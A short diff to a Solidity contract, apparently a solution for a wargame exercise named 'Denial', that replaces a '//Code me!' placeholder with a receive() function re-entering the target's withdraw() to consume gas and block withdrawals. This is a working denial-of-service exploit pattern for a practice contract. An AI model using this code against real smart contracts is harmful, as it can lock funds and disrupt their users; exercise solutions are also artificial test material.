@@ -4,10 +4,14 @@ import "./Denial.sol";
 
 contract AttackingDenial {
     address payable public contractAddress;
+    Denial private denial;
 
     constructor(address payable _contractAddress) {
         contractAddress = _contractAddress;
+        denial = Denial(_contractAddress);
     }
 
-    //Code me!
+    receive() external payable {
+        denial.withdraw();
+    }
 }
